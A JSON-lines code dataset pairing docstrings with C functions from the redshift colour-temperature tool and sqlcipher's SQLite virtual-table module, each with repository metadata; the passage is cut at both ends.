{\n\t\t\t\tfputs(_(\"Unable to get location\"\n\t\t\t\t\t\" from provider.\\n\"), stderr);\n\t\t\t\treturn -1;\n\t\t\t}\n\n\t\t\tif (!new_available &&\n\t\t\t    new_available != location_available) {\n\t\t\t\tfputs(_(\"Location is temporarily\"\n\t\t\t\t        \" unavailable; Using previous\"\n\t\t\t\t\t\" location until it becomes\"\n\t\t\t\t\t\" available...\\n\"), stderr);\n\t\t\t}\n\n\t\t\tif (new_available &&\n\t\t\t    (new_loc.lat != loc.lat ||\n\t\t\t     new_loc.lon != loc.lon ||\n\t\t\t     new_available != location_available)) {\n\t\t\t\tloc = new_loc;\n\t\t\t\tprint_location(&loc);\n\t\t\t}\n\n\t\t\tlocation_available = new_available;\n\n\t\t\tif (!location_is_valid(&loc)) {\n\t\t\t\tfputs(_(\"Invalid location returned\"\n\t\t\t\t\t\" from provider.\\n\"), stderr);\n\t\t\t\treturn -1;\n\t\t\t}\n\t\t} else {\n\t\t\tsystemtime_msleep(delay);\n\t\t}\n\t}\n\n\t/* Restore saved gamma ramps */\n\tmethod->restore(method_state);\n\n\treturn 0;\n}", "path": "redshift/src/redshift.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* Run loop for location provider thread. */\n", "func_signal": "static void *\nrun_geoclue2_loop(void *state_)", "code": "{\n\tlocation_geoclue2_state_t *state = state_;\n\n\tGMainContext *context = g_main_context_new();\n\tg_main_context_push_thread_default(context);\n\tstate->loop = g_main_loop_new(context, FALSE);\n\n\tguint watcher_id = g_bus_watch_name(\n\t\tG_BUS_TYPE_SYSTEM,\n\t\t\"org.freedesktop.GeoClue2\",\n\t\tG_BUS_NAME_WATCHER_FLAGS_AUTO_START,\n\t\ton_name_appeared,\n\t\ton_name_vanished,\n\t\tstate, NULL);\n\n\t/* Listen for closure of pipe */\n\tGIOChannel *pipe_channel = g_io_channel_unix_new(state->pipe_fd_write);\n\tGSource *pipe_source = g_io_create_watch(\n\t\tpipe_channel, G_IO_IN | G_IO_HUP | G_IO_ERR);\n        g_source_set_callback(\n\t\tpipe_source, (GSourceFunc)on_pipe_closed, state, NULL);\n        g_source_attach(pipe_source, context);\n\n\tg_main_loop_run(state->loop);\n\n\tg_source_unref(pipe_source);\n\tg_io_channel_unref(pipe_channel);\n\tclose(state->pipe_fd_write);\n\n\tg_bus_unwatch_name(watcher_id);\n\n\tg_main_loop_unref(state->loop);\n\tg_main_context_unref(context);\n\n\treturn NULL;\n}", "path": "redshift/src/location-geoclue2.c", "commit_date": "2018-08-29 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* Return current time in T as the number of seconds since the epoch. */\n", "func_signal": "int\nsystemtime_get_time(double *t)", "code": "{\n#if defined(_WIN32) /* Windows */\n\tFILETIME now;\n\tULARGE_INTEGER i;\n\tGetSystemTimeAsFileTime(&now);\n\ti.LowPart = now.dwLowDateTime;\n\ti.HighPart = now.dwHighDateTime;\n\n\t/* FILETIME is tenths of microseconds since 1601-01-01 UTC */\n\t*t = (i.QuadPart / 10000000.0) - 11644473600.0;\n#elif _POSIX_TIMERS > 0 /* POSIX timers */\n\tstruct timespec now;\n\tint r = clock_gettime(CLOCK_REALTIME, &now);\n\tif (r < 0) {\n\t\tperror(\"clock_gettime\");\n\t\treturn -1;\n\t}\n\n\t*t = now.tv_sec + (now.tv_nsec / 1000000000.0);\n#else /* other platforms */\n\tstruct timeval now;\n\tint r = gettimeofday(&now, NULL);\n\tif (r < 0) {\n\t\tperror(\"gettimeofday\");\n\t\treturn -1;\n\t}\n\n\t*t = now.tv_sec + (now.tv_usec / 1000000.0);\n#endif\n\n\treturn 0;\n}", "path": "redshift/src/systemtime.c", "commit_date": "2015-02-22 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* Check whether gamma is within allowed levels. */\n", "func_signal": "static int\ngamma_is_valid(const float gamma[3])", "code": "{\n\treturn !(gamma[0] < MIN_GAMMA ||\n\t\t gamma[0] > MAX_GAMMA ||\n\t\t gamma[1] < MIN_GAMMA ||\n\t\t gamma[1] > MAX_GAMMA ||\n\t\t gamma[2] < MIN_GAMMA ||\n\t\t gamma[2] > MAX_GAMMA);\n}", "path": "redshift/src/redshift.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* Callback when the pipe to the main thread is closed. */\n", "func_signal": "static gboolean\non_pipe_closed(GIOChannel *channel, GIOCondition condition, gpointer user_data)", "code": "{\n\tlocation_geoclue2_state_t *state = user_data;\n\tg_main_loop_quit(state->loop);\n\n\treturn FALSE;\n}", "path": "redshift/src/location-geoclue2.c", "commit_date": "2018-08-29 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* Easing function for fade.\n   See https://github.com/mietek/ease-tween */\n", "func_signal": "static double\nease_fade(double t)", "code": "{\n\tif (t <= 0) return 0;\n\tif (t >= 1) return 1;\n\treturn 1.0042954579734844 * exp(\n\t\t-6.4041738958415664 * exp(-7.2908241330981340 * t));\n}", "path": "redshift/src/redshift.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* Callback when GeoClue disappears from the bus */\n", "func_signal": "static void\non_name_vanished(GDBusConnection *connection, const gchar *name,\n\t\t gpointer user_data)", "code": "{\n\tlocation_geoclue2_state_t *state = user_data;\n\n\tg_mutex_lock(&state->lock);\n\n\tstate->available = 0;\n\n\tg_mutex_unlock(&state->lock);\n\n\tpipeutils_signal(state->pipe_fd_write);\n}", "path": "redshift/src/location-geoclue2.c", "commit_date": "2018-08-29 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* Return 1 if color settings have major differences, otherwise 0.\n   Used to determine if a fade should be applied in continual mode. */\n", "func_signal": "static int\ncolor_setting_diff_is_major(\n\tconst color_setting_t *first,\n\tconst color_setting_t *second)", "code": "{\n\treturn (abs(first->temperature - second->temperature) > 25 ||\n\t\tfabsf(first->brightness - second->brightness) > 0.1 ||\n\t\tfabsf(first->gamma[0] - second->gamma[0]) > 0.1 ||\n\t\tfabsf(first->gamma[1] - second->gamma[1]) > 0.1 ||\n\t\tfabsf(first->gamma[2] - second->gamma[2]) > 0.1);\n}", "path": "redshift/src/redshift.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* Print location */\n", "func_signal": "static void\nprint_location(const location_t *location)", "code": "{\n\t/* TRANSLATORS: Abbreviation for `north' */\n\tconst char *north = _(\"N\");\n\t/* TRANSLATORS: Abbreviation for `south' */\n\tconst char *south = _(\"S\");\n\t/* TRANSLATORS: Abbreviation for `east' */\n\tconst char *east = _(\"E\");\n\t/* TRANSLATORS: Abbreviation for `west' */\n\tconst char *west = _(\"W\");\n\n\t/* TRANSLATORS: Append degree symbols after %f if possible.\n\t   The string following each number is an abreviation for\n\t   north, source, east or west (N, S, E, W). */\n\tprintf(_(\"Location: %.2f %s, %.2f %s\\n\"),\n\t       fabs(location->lat), location->lat >= 0.f ? north : south,\n\t       fabs(location->lon), location->lon >= 0.f ? east : west);\n}", "path": "redshift/src/redshift.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* Determine how far through the transition we are based on time offset. */\n", "func_signal": "static double\nget_transition_progress_from_time(\n\tconst transition_scheme_t *transition, int time_offset)", "code": "{\n\tif (time_offset < transition->dawn.start ||\n\t    time_offset >= transition->dusk.end) {\n\t\treturn 0.0;\n\t} else if (time_offset < transition->dawn.end) {\n\t\treturn (transition->dawn.start - time_offset) /\n\t\t\t(double)(transition->dawn.start -\n\t\t\t\ttransition->dawn.end);\n\t} else if (time_offset > transition->dusk.start) {\n\t\treturn (transition->dusk.end - time_offset) /\n\t\t\t(double)(transition->dusk.end -\n\t\t\t\ttransition->dusk.start);\n\t} else {\n\t\treturn 1.0;\n\t}\n}", "path": "redshift/src/redshift.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* Print the message explaining denial from GeoClue. */\n", "func_signal": "static void\nprint_denial_message()", "code": "{\n\tg_printerr(_(\n\t\t\"Access to the current location was denied by GeoClue!\\n\"\n\t\t\"Make sure that location services are enabled and that\"\n\t\t\" Redshift is permitted\\nto use location services.\"\n\t\t\" See https://github.com/jonls/redshift#faq for more\\n\"\n\t\t\"information.\\n\"));\n}", "path": "redshift/src/location-geoclue2.c", "commit_date": "2018-08-29 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* Indicate an unrecoverable error during GeoClue2 communication. */\n", "func_signal": "static void\nmark_error(location_geoclue2_state_t *state)", "code": "{\n\tg_mutex_lock(&state->lock);\n\n\tstate->error = 1;\n\n\tg_mutex_unlock(&state->lock);\n\n\tpipeutils_signal(state->pipe_fd_write);\n}", "path": "redshift/src/location-geoclue2.c", "commit_date": "2018-08-29 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/*\n** This function is used to set the schema of a virtual table.  It is only\n** valid to call this function from within the xCreate() or xConnect() of a\n** virtual table module.\n*/\n", "func_signal": "int sqlite3_declare_vtab(sqlite3 *db, const char *zCreateTable)", "code": "{\n  VtabCtx *pCtx;\n  int rc = SQLITE_OK;\n  Table *pTab;\n  char *zErr = 0;\n  Parse sParse;\n\n#ifdef SQLITE_ENABLE_API_ARMOR\n  if( !sqlite3SafetyCheckOk(db) || zCreateTable==0 ){\n    return SQLITE_MISUSE_BKPT;\n  }\n#endif\n  sqlite3_mutex_enter(db->mutex);\n  pCtx = db->pVtabCtx;\n  if( !pCtx || pCtx->bDeclared ){\n    sqlite3Error(db, SQLITE_MISUSE);\n    sqlite3_mutex_leave(db->mutex);\n    return SQLITE_MISUSE_BKPT;\n  }\n  pTab = pCtx->pTab;\n  assert( IsVirtual(pTab) );\n\n  memset(&sParse, 0, sizeof(sParse));\n  sParse.eParseMode = PARSE_MODE_DECLARE_VTAB;\n  sParse.db = db;\n  sParse.nQueryLoop = 1;\n  if( SQLITE_OK==sqlite3RunParser(&sParse, zCreateTable, &zErr) \n   && sParse.pNewTable\n   && !db->mallocFailed\n   && !sParse.pNewTable->pSelect\n   && !IsVirtual(sParse.pNewTable)\n  ){\n    if( !pTab->aCol ){\n      Table *pNew = sParse.pNewTable;\n      Index *pIdx;\n      pTab->aCol = pNew->aCol;\n      pTab->nCol = pNew->nCol;\n      pTab->tabFlags |= pNew->tabFlags & (TF_WithoutRowid|TF_NoVisibleRowid);\n      pNew->nCol = 0;\n      pNew->aCol = 0;\n      assert( pTab->pIndex==0 );\n      assert( HasRowid(pNew) || sqlite3PrimaryKeyIndex(pNew)!=0 );\n      if( !HasRowid(pNew)\n       && pCtx->pVTable->pMod->pModule->xUpdate!=0\n       && sqlite3PrimaryKeyIndex(pNew)->nKeyCol!=1\n      ){\n        /* WITHOUT ROWID virtual tables must either be read-only (xUpdate==0)\n        ** or else must have a single-column PRIMARY KEY */\n        rc = SQLITE_ERROR;\n      }\n      pIdx = pNew->pIndex;\n      if( pIdx ){\n        assert( pIdx->pNext==0 );\n        pTab->pIndex = pIdx;\n        pNew->pIndex = 0;\n        pIdx->pTable = pTab;\n      }\n    }\n    pCtx->bDeclared = 1;\n  }else{\n    sqlite3ErrorWithMsg(db, SQLITE_ERROR, (zErr ? \"%s\" : 0), zErr);\n    sqlite3DbFree(db, zErr);\n    rc = SQLITE_ERROR;\n  }\n  sParse.eParseMode = PARSE_MODE_NORMAL;\n\n  if( sParse.pVdbe ){\n    sqlite3VdbeFinalize(sParse.pVdbe);\n  }\n  sqlite3DeleteTable(db, sParse.pNewTable);\n  sqlite3ParserReset(&sParse);\n\n  assert( (rc&0xff)==rc );\n  rc = sqlite3ApiExit(db, rc);\n  sqlite3_mutex_leave(db->mutex);\n  return rc;\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** Table *p is a virtual table. This function removes the VTable object\n** for table *p associated with database connection db from the linked\n** list in p->pVTab. It also decrements the VTable ref count. This is\n** used when closing database connection db to free all of its VTable\n** objects without disturbing the rest of the Schema object (which may\n** be being used by other shared-cache connections).\n*/\n", "func_signal": "void sqlite3VtabDisconnect(sqlite3 *db, Table *p)", "code": "{\n  VTable **ppVTab;\n\n  assert( IsVirtual(p) );\n  assert( sqlite3BtreeHoldsAllMutexes(db) );\n  assert( sqlite3_mutex_held(db->mutex) );\n\n  for(ppVTab=&p->pVTable; *ppVTab; ppVTab=&(*ppVTab)->pNext){\n    if( (*ppVTab)->db==db  ){\n      VTable *pVTab = *ppVTab;\n      *ppVTab = pVTab->pNext;\n      sqlite3VtabUnlock(pVTab);\n      break;\n    }\n  }\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** Invoke the xCommit method of all virtual tables in the \n** sqlite3.aVTrans array. Then clear the array itself.\n*/\n", "func_signal": "int sqlite3VtabCommit(sqlite3 *db)", "code": "{\n  callFinaliser(db, offsetof(sqlite3_module,xCommit));\n  return SQLITE_OK;\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** The parser calls this routine after the CREATE VIRTUAL TABLE statement\n** has been completely parsed.\n*/\n", "func_signal": "void sqlite3VtabFinishParse(Parse *pParse, Token *pEnd)", "code": "{\n  Table *pTab = pParse->pNewTable;  /* The table being constructed */\n  sqlite3 *db = pParse->db;         /* The database connection */\n\n  if( pTab==0 ) return;\n  addArgumentToVtab(pParse);\n  pParse->sArg.z = 0;\n  if( pTab->nModuleArg<1 ) return;\n  \n  /* If the CREATE VIRTUAL TABLE statement is being entered for the\n  ** first time (in other words if the virtual table is actually being\n  ** created now instead of just being read out of sqlite_schema) then\n  ** do additional initialization work and store the statement text\n  ** in the sqlite_schema table.\n  */\n  if( !db->init.busy ){\n    char *zStmt;\n    char *zWhere;\n    int iDb;\n    int iReg;\n    Vdbe *v;\n\n    sqlite3MayAbort(pParse);\n\n    /* Compute the complete text of the CREATE VIRTUAL TABLE statement */\n    if( pEnd ){\n      pParse->sNameToken.n = (int)(pEnd->z - pParse->sNameToken.z) + pEnd->n;\n    }\n    zStmt = sqlite3MPrintf(db, \"CREATE VIRTUAL TABLE %T\", &pParse->sNameToken);\n\n    /* A slot for the record has already been allocated in the \n    ** schema table.  We just need to update that slot with all\n    ** the information we've collected.  \n    **\n    ** The VM register number pParse->regRowid holds the rowid of an\n    ** entry in the sqlite_schema table tht was created for this vtab\n    ** by sqlite3StartTable().\n    */\n    iDb = sqlite3SchemaToIndex(db, pTab->pSchema);\n    sqlite3NestedParse(pParse,\n      \"UPDATE %Q.\" DFLT_SCHEMA_TABLE \" \"\n         \"SET type='table', name=%Q, tbl_name=%Q, rootpage=0, sql=%Q \"\n       \"WHERE rowid=#%d\",\n      db->aDb[iDb].zDbSName,\n      pTab->zName,\n      pTab->zName,\n      zStmt,\n      pParse->regRowid\n    );\n    v = sqlite3GetVdbe(pParse);\n    sqlite3ChangeCookie(pParse, iDb);\n\n    sqlite3VdbeAddOp0(v, OP_Expire);\n    zWhere = sqlite3MPrintf(db, \"name=%Q AND sql=%Q\", pTab->zName, zStmt);\n    sqlite3VdbeAddParseSchemaOp(v, iDb, zWhere);\n    sqlite3DbFree(db, zStmt);\n\n    iReg = ++pParse->nMem;\n    sqlite3VdbeLoadString(v, iReg, pTab->zName);\n    sqlite3VdbeAddOp2(v, OP_VCreate, iDb, iReg);\n  }\n\n  /* If we are rereading the sqlite_schema table create the in-memory\n  ** record of the table. The xConnect() method is not called until\n  ** the first time the virtual table is used in an SQL statement. This\n  ** allows a schema that contains virtual tables to be loaded before\n  ** the required virtual table implementations are registered.  */\n  else {\n    Table *pOld;\n    Schema *pSchema = pTab->pSchema;\n    const char *zName = pTab->zName;\n    assert( sqlite3SchemaMutexHeld(db, 0, pSchema) );\n    pOld = sqlite3HashInsert(&pSchema->tblHash, zName, pTab);\n    if( pOld ){\n      sqlite3OomFault(db);\n      assert( pTab==pOld );  /* Malloc must have failed inside HashInsert() */\n      return;\n    }\n    pParse->pNewTable = 0;\n  }\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** Table p is a virtual table. This function moves all elements in the\n** p->pVTable list to the sqlite3.pDisconnect lists of their associated\n** database connections to be disconnected at the next opportunity. \n** Except, if argument db is not NULL, then the entry associated with\n** connection db is left in the p->pVTable list.\n*/\n", "func_signal": "static VTable *vtabDisconnectAll(sqlite3 *db, Table *p)", "code": "{\n  VTable *pRet = 0;\n  VTable *pVTable = p->pVTable;\n  p->pVTable = 0;\n\n  /* Assert that the mutex (if any) associated with the BtShared database \n  ** that contains table p is held by the caller. See header comments \n  ** above function sqlite3VtabUnlockList() for an explanation of why\n  ** this makes it safe to access the sqlite3.pDisconnect list of any\n  ** database connection that may have an entry in the p->pVTable list.\n  */\n  assert( db==0 || sqlite3SchemaMutexHeld(db, 0, p->pSchema) );\n\n  while( pVTable ){\n    sqlite3 *db2 = pVTable->db;\n    VTable *pNext = pVTable->pNext;\n    assert( db2 );\n    if( db2==db ){\n      pRet = pVTable;\n      p->pVTable = pRet;\n      pRet->pNext = 0;\n    }else{\n      pVTable->pNext = db2->pDisconnect;\n      db2->pDisconnect = pVTable;\n    }\n    pVTable = pNext;\n  }\n\n  assert( !db || pRet );\n  return pRet;\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** Invoke a virtual table constructor (either xCreate or xConnect). The\n** pointer to the function to invoke is passed as the fourth parameter\n** to this procedure.\n*/\n", "func_signal": "static int vtabCallConstructor(\n  sqlite3 *db, \n  Table *pTab,\n  Module *pMod,\n  int (*xConstruct)(sqlite3*,void*,int,const char*const*,sqlite3_vtab**,char**),\n  char **pzErr\n)", "code": "{\n  VtabCtx sCtx;\n  VTable *pVTable;\n  int rc;\n  const char *const*azArg = (const char *const*)pTab->azModuleArg;\n  int nArg = pTab->nModuleArg;\n  char *zErr = 0;\n  char *zModuleName;\n  int iDb;\n  VtabCtx *pCtx;\n\n  /* Check that the virtual-table is not already being initialized */\n  for(pCtx=db->pVtabCtx; pCtx; pCtx=pCtx->pPrior){\n    if( pCtx->pTab==pTab ){\n      *pzErr = sqlite3MPrintf(db, \n          \"vtable constructor called recursively: %s\", pTab->zName\n      );\n      return SQLITE_LOCKED;\n    }\n  }\n\n  zModuleName = sqlite3DbStrDup(db, pTab->zName);\n  if( !zModuleName ){\n    return SQLITE_NOMEM_BKPT;\n  }\n\n  pVTable = sqlite3MallocZero(sizeof(VTable));\n  if( !pVTable ){\n    sqlite3OomFault(db);\n    sqlite3DbFree(db, zModuleName);\n    return SQLITE_NOMEM_BKPT;\n  }\n  pVTable->db = db;\n  pVTable->pMod = pMod;\n  pVTable->eVtabRisk = SQLITE_VTABRISK_Normal;\n\n  iDb = sqlite3SchemaToIndex(db, pTab->pSchema);\n  pTab->azModuleArg[1] = db->aDb[iDb].zDbSName;\n\n  /* Invoke the virtual table constructor */\n  assert( &db->pVtabCtx );\n  assert( xConstruct );\n  sCtx.pTab = pTab;\n  sCtx.pVTable = pVTable;\n  sCtx.pPrior = db->pVtabCtx;\n  sCtx.bDeclared = 0;\n  db->pVtabCtx = &sCtx;\n  rc = xConstruct(db, pMod->pAux, nArg, azArg, &pVTable->pVtab, &zErr);\n  db->pVtabCtx = sCtx.pPrior;\n  if( rc==SQLITE_NOMEM ) sqlite3OomFault(db);\n  assert( sCtx.pTab==pTab );\n\n  if( SQLITE_OK!=rc ){\n    if( zErr==0 ){\n      *pzErr = sqlite3MPrintf(db, \"vtable constructor failed: %s\", zModuleName);\n    }else {\n      *pzErr = sqlite3MPrintf(db, \"%s\", zErr);\n      sqlite3_free(zErr);\n    }\n    sqlite3DbFree(db, pVTable);\n  }else if( ALWAYS(pVTable->pVtab) ){\n    /* Justification of ALWAYS():  A correct vtab constructor must allocate\n    ** the sqlite3_vtab object if successful.  */\n    memset(pVTable->pVtab, 0, sizeof(pVTable->pVtab[0]));\n    pVTable->pVtab->pModule = pMod->pModule;\n    pMod->nRefModule++;\n    pVTable->nRef = 1;\n    if( sCtx.bDeclared==0 ){\n      const char *zFormat = \"vtable constructor did not declare schema: %s\";\n      *pzErr = sqlite3MPrintf(db, zFormat, pTab->zName);\n      sqlite3VtabUnlock(pVTable);\n      rc = SQLITE_ERROR;\n    }else{\n      int iCol;\n      u16 oooHidden = 0;\n      /* If everything went according to plan, link the new VTable structure\n      ** into the linked list headed by pTab->pVTable. Then loop through the \n      ** columns of the table to see if any of them contain the token \"hidden\".\n      ** If so, set the Column COLFLAG_HIDDEN flag and remove the token from\n      ** the type string.  */\n      pVTable->pNext = pTab->pVTable;\n      pTab->pVTable = pVTable;\n\n      for(iCol=0; iCol<pTab->nCol; iCol++){\n        char *zType = sqlite3ColumnType(&pTab->aCol[iCol], \"\");\n        int nType;\n        int i = 0;\n        nType = sqlite3Strlen30(zType);\n        for(i=0; i<nType; i++){\n          if( 0==sqlite3StrNICmp(\"hidden\", &zType[i], 6)\n           && (i==0 || zType[i-1]==' ')\n           && (zType[i+6]=='\\0' || zType[i+6]==' ')\n          ){\n            break;\n          }\n        }\n        if( i<nType ){\n          int j;\n          int nDel = 6 + (zType[i+6] ? 1 : 0);\n          for(j=i; (j+nDel)<=nType; j++){\n            zType[j] = zType[j+nDel];\n          }\n          if( zType[i]=='\\0' && i>0 ){\n            assert(zType[i-1]==' ');\n            zType[i-1] = '\\0';\n          }\n          pTab->aCol[iCol].colFlags |= COLFLAG_HIDDEN;\n          oooHidden = TF_OOOHidden;\n        }else{\n          pTab->tabFlags |= oooHidden;\n        }\n      }\n    }\n  }\n\n  sqlite3DbFree(db, zModuleName);\n  return rc;\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** The parser calls this routine when it sees the first token\n** of an argument to the module name in a CREATE VIRTUAL TABLE statement.\n*/\n", "func_signal": "void sqlite3VtabArgInit(Parse *pParse)", "code": "{\n  addArgumentToVtab(pParse);\n  pParse->sArg.z = 0;\n  pParse->sArg.n = 0;\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** This function is invoked by the vdbe to call the xCreate method\n** of the virtual table named zTab in database iDb. \n**\n** If an error occurs, *pzErr is set to point to an English language\n** description of the error and an SQLITE_XXX error code is returned.\n** In this case the caller must call sqlite3DbFree(db, ) on *pzErr.\n*/\n", "func_signal": "int sqlite3VtabCallCreate(sqlite3 *db, int iDb, const char *zTab, char **pzErr)", "code": "{\n  int rc = SQLITE_OK;\n  Table *pTab;\n  Module *pMod;\n  const char *zMod;\n\n  pTab = sqlite3FindTable(db, zTab, db->aDb[iDb].zDbSName);\n  assert( pTab && IsVirtual(pTab) && !pTab->pVTable );\n\n  /* Locate the required virtual table module */\n  zMod = pTab->azModuleArg[0];\n  pMod = (Module*)sqlite3HashFind(&db->aModule, zMod);\n\n  /* If the module has been registered and includes a Create method, \n  ** invoke it now. If the module has not been registered, return an \n  ** error. Otherwise, do nothing.\n  */\n  if( pMod==0 || pMod->pModule->xCreate==0 || pMod->pModule->xDestroy==0 ){\n    *pzErr = sqlite3MPrintf(db, \"no such module: %s\", zMod);\n    rc = SQLITE_ERROR;\n  }else{\n    rc = vtabCallConstructor(db, pTab, pMod, pMod->pModule->xCreate, pzErr);\n  }\n\n  /* Justification of ALWAYS():  The xConstructor method is required to\n  ** create a valid sqlite3_vtab if it returns SQLITE_OK. */\n  if( rc==SQLITE_OK && ALWAYS(sqlite3GetVTable(db, pTab)) ){\n    rc = growVTrans(db);\n    if( rc==SQLITE_OK ){\n      addToVTrans(db, sqlite3GetVTable(db, pTab));\n    }\n  }\n\n  return rc;\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** The parser calls this routine for each token after the first token\n** in an argument to the module name in a CREATE VIRTUAL TABLE statement.\n*/\n", "func_signal": "void sqlite3VtabArgExtend(Parse *pParse, Token *p)", "code": "{\n  Token *pArg = &pParse->sArg;\n  if( pArg->z==0 ){\n    pArg->z = p->z;\n    pArg->n = p->n;\n  }else{\n    assert(pArg->z <= p->z);\n    pArg->n = (int)(&p->z[p->n] - pArg->z);\n  }\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** Grow the db->aVTrans[] array so that there is room for at least one\n** more v-table. Return SQLITE_NOMEM if a malloc fails, or SQLITE_OK otherwise.\n*/\n", "func_signal": "static int growVTrans(sqlite3 *db)", "code": "{\n  const int ARRAY_INCR = 5;\n\n  /* Grow the sqlite3.aVTrans array if required */\n  if( (db->nVTrans%ARRAY_INCR)==0 ){\n    VTable **aVTrans;\n    sqlite3_int64 nBytes = sizeof(sqlite3_vtab*)*\n                                 ((sqlite3_int64)db->nVTrans + ARRAY_INCR);\n    aVTrans = sqlite3DbRealloc(db, (void *)db->aVTrans, nBytes);\n    if( !aVTrans ){\n      return SQLITE_NOMEM_BKPT;\n    }\n    memset(&aVTrans[db->nVTrans], 0, sizeof(sqlite3_vtab *)*ARRAY_INCR);\n    db->aVTrans = aVTrans;\n  }\n\n  return SQLITE_OK;\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** This function is invoked by the parser to call the xConnect() method\n** of the virtual table pTab. If an error occurs, an error code is returned \n** and an error left in pParse.\n**\n** This call is a no-op if table pTab is not a virtual table.\n*/\n", "func_signal": "int sqlite3VtabCallConnect(Parse *pParse, Table *pTab)", "code": "{\n  sqlite3 *db = pParse->db;\n  const char *zMod;\n  Module *pMod;\n  int rc;\n\n  assert( pTab );\n  if( !IsVirtual(pTab) || sqlite3GetVTable(db, pTab) ){\n    return SQLITE_OK;\n  }\n\n  /* Locate the required virtual table module */\n  zMod = pTab->azModuleArg[0];\n  pMod = (Module*)sqlite3HashFind(&db->aModule, zMod);\n\n  if( !pMod ){\n    const char *zModule = pTab->azModuleArg[0];\n    sqlite3ErrorMsg(pParse, \"no such module: %s\", zModule);\n    rc = SQLITE_ERROR;\n  }else{\n    char *zErr = 0;\n    rc = vtabCallConstructor(db, pTab, pMod, pMod->pModule->xConnect, &zErr);\n    if( rc!=SQLITE_OK ){\n      sqlite3ErrorMsg(pParse, \"%s\", zErr);\n      pParse->rc = rc;\n    }\n    sqlite3DbFree(db, zErr);\n  }\n\n  return rc;\n}", "path": "sqlcipher/src/vtab.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "sqlcipher/sqlcipher", "stars": 5860, "license": "other", "language": "c", "size": 50337}
{"docstring": "/*\n** Call from within the xCreate() or xConnect() methods to provide \n** the SQLite core with additional information about the behavior\n** of the virtual table being implemented.\n*/\n", "func_signal": "int sqlite3_vtab_config(sqlite3 *db, int op, ...)", "code": "{\n  va_list ap;\n  int rc = SQLITE_OK;\n  VtabCtx *p;\n\n#ifdef SQLITE_ENABLE_API_ARMOR\n  if( !sqlite3SafetyCheckOk(db) ) return SQLITE_MISUSE_BKPT;\n#endif\n  sqlite3_mutex_enter(db->mutex);\n  p = db->pVtabCtx;\n  if( !p ){\n    rc = SQLITE_MISUSE_BKPT;\n  }else{\n    assert( p->pTab==0 || IsVirtual(p->pTab) );\n    va_start(ap, op);\n    switch( op ){\n      case SQLITE_VTAB_CONSTRAINT_SUPPORT: {\n        p->pVTable->bConstraint = (u8)va_arg(ap, int);\n        break;\n      }\n      case SQLITE_VTAB_INNOCUOUS: {\n        p->pVTable->eVtabRisk = SQLITE_VTABRISK_Low;\n        break;\n      }\n      case SQLITE_VTAB_DIRECTONLY: {\n        p->pVTable->eVtabRisk = SQLITE_VTABRISK_High;\n        break;\n      }\n      default: {\n        rc = SQLITE_MISUSE_BKPT;\n        break;\n      }\n    }\n    va_end(ap);\n  }\n\n  if( rc!=SQLITE_OK ) sqlite3Error(db, rc);\n  sqlite3_mutex_leave(db->mutex);\n  return rc;\n}", "path": 